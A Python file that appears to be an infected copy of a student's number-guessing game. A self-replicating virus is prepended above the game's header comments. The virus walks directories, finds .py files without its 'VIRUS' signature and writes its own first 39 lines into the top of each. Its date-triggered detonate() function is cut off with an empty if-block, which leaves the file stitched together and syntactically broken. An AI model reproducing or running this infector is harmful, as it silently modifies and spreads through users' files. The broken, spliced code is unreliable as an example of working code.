#!/usr/bin/python3
import os
import datetime

SIGNATURE = "VIRUS"

def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
# script: Ops Challenge: Class 07
# Author:  Barbara L. Beaufort
# Date of latest revision: 6/21/2023
# Purpose:  Create a number guessing game
#Main

# Bob wants to create a guessing number game!
# Rule 1: Numbers have to be between 1 and 20
# Rule 2: Program must run until the correct number is guessed
# Rule 3: When guessed right, print out how many tries to guess the
# right number. Example: "Yes! You guessed it in ___ guesses."
# Rule 4: The program will tell you if your number needs to be HIGHER
# or LOWER
# until the number is guessed correctly and the program ENDS.
# Remeber to import the random function
#Bonus objective can you put it into a loop to make the game end after 3 turns?

import random
def guess_number():
    number_to_guess = random.randint(1, 20)
    tries = 0
    while tries < 3:
        print("Guess a number between 1 and 20:")
        user_guess = int(input())
        tries = tries + 1
        if user_guess > number_to_guess:
            print("TOO HIGH!")
        elif user_guess < number_to_guess:
            print("TOO LOW!")
        elif user_guess == number_to_guess:
            print("YOU DID IT!  AWESOME!! " + str(tries) + " guesses.")
            return
    print("Sorry! You didn't get it in 3 tries. The number was " + str(number_to_guess))
guess_number()